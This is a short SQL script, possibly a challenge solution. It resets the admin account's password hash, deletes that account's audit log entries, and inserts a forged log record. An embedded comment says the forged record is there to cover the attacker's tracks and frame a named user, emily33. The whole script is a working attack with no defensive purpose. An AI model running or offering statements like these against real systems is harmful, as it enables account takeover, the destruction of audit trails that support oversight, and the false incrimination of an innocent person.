UPDATE "users" SET password = '982c0381c279d139fd221fce974916e7'
WHERE "id" = 1;

DELETE FROM user_logs WHERE old_username = 'admin'

/*
Add false data to throw others off your trail. In particular,
to frame emily33, make it only appear—in the user_logs table—as if the
admin account has had its password changed to emily33’s password.
*/
-- emily33 = cb4772eeda0ae562119b6c4be2e0889a

INSERT INTO user_logs( "type", "old_username", "new_username", "old_password", "new_password")
VALUES ('update', 'admin', 'admin', 'e10adc3949ba59abbe56e057f20f883e', 'cb4772eeda0ae562119b6c4be2e0889a');
